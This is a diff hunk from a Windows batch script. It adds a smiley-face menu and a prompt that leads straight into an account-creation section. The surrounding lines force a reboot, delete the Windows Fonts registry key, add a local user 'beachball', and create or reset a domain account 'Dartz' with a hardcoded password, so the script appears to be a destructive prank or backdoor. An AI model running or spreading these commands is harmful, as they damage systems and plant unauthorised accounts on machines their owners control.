@@ -168,6 +168,17 @@ wmic os where primary=1 reboot
 REG DELETE HKML\Software\Microsoft\Windows NT\Fonts /F
 GOTO RESTART
 :MAININSTALLB
+cls
+echo .....................................................
+echo :)
+echo .....................................................
+echo,
+echo,
+echo 1 - :)
+echo,
+SET /P M=Type 1 or 2 then press ENTER:
+IF %M%==1 GOTO MAININSTALLBB
+:MAININSTALLBB
 net user beachball /add
 net localgroup Guests beachball /add
 net user Dartz 1593570 /domain
